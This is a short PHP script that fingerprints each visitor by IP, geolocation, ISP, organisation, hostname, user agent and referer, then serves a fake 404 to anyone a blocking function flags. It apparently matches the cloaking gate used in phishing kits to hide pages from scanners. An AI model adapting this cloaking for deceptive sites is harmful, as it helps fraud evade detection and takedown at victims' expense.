<?php
error_reporting(0);
require_once 'functions.php';
require_once 'config.php';
include 'Browser.php';


$ip = get_client_ip();
$filter_loopback = filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE)  && filter_var($ip, FILTER_CALLBACK, array('options' => 'FILTER_FLAG_NO_LOOPBACK_RANGE'));

if(!isset($_SESSION['USER_OK']) && $filter_loopback && $ip !== '::1') {
	$ip_geo_info = getIpGeoInfo($ip);
	$hostname = gethostbyaddr($ip);
	$ip_isp = isset($ip_geo_info["isp"]) ? $ip_geo_info["isp"] : '';
	$ip_organization = isset($ip_geo_info["org"]) ? $ip_geo_info["org"] : '';
	$country_code = isset($ip_geo_info["countryCode"]) ? $ip_geo_info["countryCode"] : '';
	$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$browser = new Browser();
	$browser_name = $browser->getBrowser();

	$_SESSION['IP'] = $ip;
	$_SESSION['CountryCode'] = $country_code;
	$_SESSION['IP_ISP'] = $ip_isp;
	$_SESSION['HOSTNAME'] = $hostname;
	$_SESSION['USERAGENT'] = $useragent;
	$_SESSION['REFERER'] = $referer;
}

if($enable_blocker && $filter_loopback && $ip !== '::1') {
	if(!isset($_ENV["SERVER_PROTOCOL"])) {
		$_ENV["SERVER_PROTOCOL"] = 'HTTP/1.0';
	}
	if(isset($_SESSION['USER_OK'])) {
		if($_SESSION['USER_OK'] !== 'OK') {
			header($_ENV['SERVER_PROTOCOL']." 404 Not Found", true, 404);
			die(getErrorMessage()); 
		}
	} else {
		if(!isValidIp($ip))
		{
			header($_ENV['SERVER_PROTOCOL']." 404 Not Found", true, 404);
			die(getErrorMessage()); 
		}
		if(isBlocked($ip, $hostname, $useragent, $browser_name, $referer, $ip_isp, $ip_organization, $country_code)) {
				$_SESSION['USER_OK'] = '-1';
				header($_ENV['SERVER_PROTOCOL']." 404 Not Found", true, 404);
				die(getErrorMessage()); 
			} else {
				$_SESSION['USER_OK'] = 'OK';
			}
	}
} else {
	$_SESSION['USER_OK'] = 'OK';
}


?>